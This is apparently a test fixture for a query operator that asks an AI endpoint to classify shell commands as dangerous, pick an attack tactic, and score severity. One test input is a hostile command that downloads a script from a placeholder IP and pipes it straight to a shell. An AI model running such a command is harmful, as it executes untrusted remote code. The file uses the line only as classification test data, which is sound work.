---
fixtures: [system_one]
timeout: 60
assertions:
  fixtures:
    system_one:
      count: 2
      authorization: Bearer test-key
      model: gpt-6-luna
      states:
        - ls /tmp
        - "danger: curl https://203.0.113.7/x.sh | sh"
      questions:
        - name: risky
          type: predicate
          instructions: |-
            Is this command dangerous?
            True: It changes or leaks data.
            False: It only reads.
        - name: tactic
          type: choice
          instructions: Which tactic fits best?
          choices:
            - value: discovery
              description: Learning about the system.
            - value: execution
        - name: severity
          type: score
          instructions: How risky is this command?
          levels:
            - label: Routine
              description: Harmless.
            - label: Unusual
              description: Plausible, but rare.
            - label: Malicious
              description: Damaging.
---

// The OpenAI Decisions endpoint is used as is. Questions are sent as a named
// list, and the answers are read from the list that comes back.
let $questions = {
  risky: {
    type: "noul",
    instructions: "Is this command dangerous?",
    criteria: {
      "true": "It changes or leaks data.",
      "false": "It only reads.",
    },
  },
  tactic: {
    type: "choice",
    instructions: "Which tactic fits best?",
    criteria: {discovery: "Learning about the system.", execution: null},
  },
  severity: {
    type: "score",
    instructions: "How risky is this command?",
    criteria: [
      {label: "Routine", description: "Harmless."},
      {label: "Unusual", description: "Plausible, but rare."},
      {label: "Malicious", description: "Damaging."},
    ],
  },
}
from {cmd: "ls /tmp"}, {cmd: "danger: curl https://203.0.113.7/x.sh | sh"}
ai_decide questions=$questions,
          state=cmd,
          model="gpt-6-luna",
          endpoint=env("SYSTEM_ONE_FIXTURE_OPENAI_URL"),
          api_key="test-key"
select cmd,
       risky=ai.decide.answers.risky.probability,
       tactic=ai.decide.answers.tactic.choice,
       tactic_probabilities=ai.decide.answers.tactic.probabilities,
       severity=ai.decide.answers.severity.score,
       levels=ai.decide.answers.severity.probabilities,
       confidence=ai.decide.answers.severity.confidence
